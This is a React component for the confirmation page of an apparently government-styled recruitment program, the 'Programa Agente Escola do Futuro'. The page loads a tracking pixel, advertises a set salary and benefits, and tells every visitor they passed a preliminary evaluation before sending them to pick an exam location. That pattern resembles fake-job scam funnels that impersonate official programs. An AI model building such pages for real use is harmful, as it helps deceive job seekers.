import React from 'react';
import { MapPin, DollarSign, Gift, GraduationCap, Check } from 'lucide-react';
import { usePixelTracking } from '../hooks/usePixelTracking';

const ConfirmationPage: React.FC = () => {
  usePixelTracking();

  return (
    <main className="container mx-auto px-4 py-8 flex-grow">
      <div className="max-w-2xl mx-auto">
        <h1 className="text-[#1351B4] text-2xl font-bold mb-6">
          Inscrição no Programa Agente Escola do Futuro
        </h1>
        
        <h2 className="text-xl font-bold mb-8">Confirmação da sua Inscrição</h2>

        <div className="space-y-8">
          <div className="flex items-start gap-4">
            <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center mt-1">
              <Check size={16} className="text-white" />
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 text-lg font-semibold mb-1">
                <MapPin size={20} className="text-[#1351B4]" />
                Confirmação da Região
              </div>
              <p className="text-gray-600">vagas disponíveis</p>
            </div>
          </div>

          <div className="flex items-start gap-4">
            <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center mt-1">
              <Check size={16} className="text-white" />
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 text-lg font-semibold mb-1">
                <DollarSign size={20} className="text-[#1351B4]" />
                Salário Disponível
              </div>
              <p className="text-green-600 font-medium">R$ 3.456,13 mensais</p>
            </div>
          </div>

          <div className="flex items-start gap-4">
            <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center mt-1">
              <Check size={16} className="text-white" />
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 text-lg font-semibold mb-1">
                <Gift size={20} className="text-[#1351B4]" />
                Benefícios Adicionais
              </div>
              <p className="text-gray-600">Vale alimentação, plano de saúde e seguro de vida</p>
            </div>
          </div>

          <div className="flex items-start gap-4">
            <div className="w-6 h-6 rounded-full bg-green-500 flex items-center justify-center mt-1">
              <Check size={16} className="text-white" />
            </div>
            <div className="flex-1">
              <div className="flex items-center gap-2 text-lg font-semibold mb-1">
                <GraduationCap size={20} className="text-[#1351B4]" />
                Treinamento Gratuito
              </div>
              <p className="text-gray-600">
                Capacitação integral e efetiva, com certificado reconhecido nacionalmente
              </p>
            </div>
          </div>
        </div>

        <div className="mt-8 p-6 bg-green-50 rounded-lg border border-green-100">
          <h3 className="text-green-700 font-bold text-lg mb-2">
            Parabéns! Sua avaliação preliminar foi bem-sucedida.
          </h3>
          <p className="text-gray-700">
            Selecione abaixo um local para realização da sua prova de admissão no programa. 
            Esta é a última etapa para concluir sua inscrição.
          </p>
        </div>
      </div>
    </main>
  );
};

export default ConfirmationPage;